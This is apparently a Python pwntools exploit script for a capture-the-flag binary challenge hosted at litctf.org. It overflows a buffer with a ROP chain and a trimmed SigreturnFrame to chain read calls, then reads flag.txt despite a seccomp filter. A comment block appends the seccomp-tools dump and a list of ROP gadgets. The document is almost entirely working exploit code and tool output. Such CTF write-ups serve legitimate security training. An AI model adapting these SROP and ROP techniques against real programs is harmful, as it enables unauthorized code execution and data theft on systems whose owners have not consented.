#!/usr/bin/python3

from pwn import *

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b* 0x401356
        b* 0x40135B
        c
        ''')
        input()


if args.REMOTE:
    p = remote('litctf.org', 31771)
else:
    p = process(exe.path)
GDB()
pop_rsi_r15 = 0x00000000004013d1
pop_rdi = 0x00000000004013d3
mov_eax = 0x0000000000401364
f = SigreturnFrame()
f.rdi = 0
f.rsi = 0x404038
f.rdx = 0x10
f.rsp = 0x404038
f.rip = exe.plt.read
f = bytes(f)
f = f[:-0x49]
pa = b'a'*32 + flat(0,
    pop_rsi_r15, 0x404030-0xe, 0, 
    exe.plt.read,
    exe.plt.read,
    )  + f
sl(pa)
s(b'flag.txt\0\0\0\0\0\0' + p8(0xf0))
p.interactive()
'''
└─$ seccomp-tools dump ./main
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
 0005: 0x15 0x0e 0x00 0x00000011  if (A == pread64) goto 0020
 0006: 0x15 0x0d 0x00 0x00000013  if (A == readv) goto 0020
 0007: 0x15 0x0c 0x00 0x0000003b  if (A == execve) goto 0020
 0008: 0x15 0x0b 0x00 0x00000059  if (A == readlink) goto 0020
 0009: 0x15 0x0a 0x00 0x000000bb  if (A == readahead) goto 0020
 0010: 0x15 0x09 0x00 0x0000010b  if (A == readlinkat) goto 0020
 0011: 0x15 0x08 0x00 0x00000127  if (A == preadv) goto 0020
 0012: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0020
 0013: 0x15 0x06 0x00 0x00000147  if (A == preadv2) goto 0020
 0014: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0019
 0015: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
 0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020
 0017: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0018: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
 
0x00000000004013cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013ce : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013d0 : pop r14 ; pop r15 ; ret
0x00000000004013d2 : pop r15 ; ret
0x00000000004013cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004013cf : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040117d : pop rbp ; ret
0x00000000004013d3 : pop rdi ; ret
0x00000000004013d1 : pop rsi ; pop r15 ; ret
0x00000000004013cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
'''